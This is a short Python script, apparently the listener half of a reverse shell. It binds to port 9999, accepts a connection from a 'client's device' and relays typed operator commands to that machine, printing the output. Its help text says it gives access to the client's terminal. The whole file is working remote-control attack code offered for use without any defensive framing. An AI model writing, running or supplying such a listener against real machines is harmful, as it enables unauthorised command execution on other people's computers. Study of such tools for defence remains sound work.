import socket
import sys


#creating socket
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
        print("Created a new socket")
    except socket.error as err:
        print("Error in creating Socket - ",err)

#Bind socket
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port ",str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as err:
        print("Error in Binding socket - ",err)
        print("Trying to bind again...")
        socket_bind()

#accepting connections
def socket_accept():
    c,addr = s.accept()
    print("Connection established by "+ str(addr[0]) + " from port " + str(addr[1]))
    send_commands(c)
    c.close()
def send_commands(c):
    while True:
        cmd = input(">>> ")
        if cmd == "quit" or   cmd == "exit":
            c.send(str.encode(cmd))
            c.close()
            s.close()
            sys.exit()
        if cmd == "help" :
            print("You are now connected to the client's device...\nRun the OS commands of the client's device , you can access the terminal of the client.\n\n ")
        if len(cmd)>0:
            c.send(str.encode(cmd))
            responce = str(c.recv(6144), "utf-8")
            print(responce,end = "")

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()